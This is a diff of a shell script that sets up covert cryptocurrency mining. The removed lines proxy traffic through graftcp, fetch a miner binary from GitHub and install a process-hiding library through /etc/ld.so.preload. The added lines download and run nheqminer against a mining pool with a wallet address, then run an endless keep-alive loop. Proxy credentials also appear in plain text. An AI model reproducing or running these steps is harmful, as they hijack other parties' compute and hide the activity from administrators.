@@ -16,34 +16,17 @@ socks5_username = sempakcok
 socks5_password = gunturmanis
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 
-sleep .2
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
 
-echo " "
-echo " "
+tar xf nheqminer-Linux-v0.8.2.tar.gz
 
-echo "**"
+cd nheqminer
 
-./graftcp/graftcp curl ifconfig.me
+./nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.luckpool  -p x -t 4
 
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/githuboneheart/-/raw/main/views/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://github.com/githuboneheart/-/raw/main/views/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
-
+while [ 1 ]; do
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+sleep 2
+done
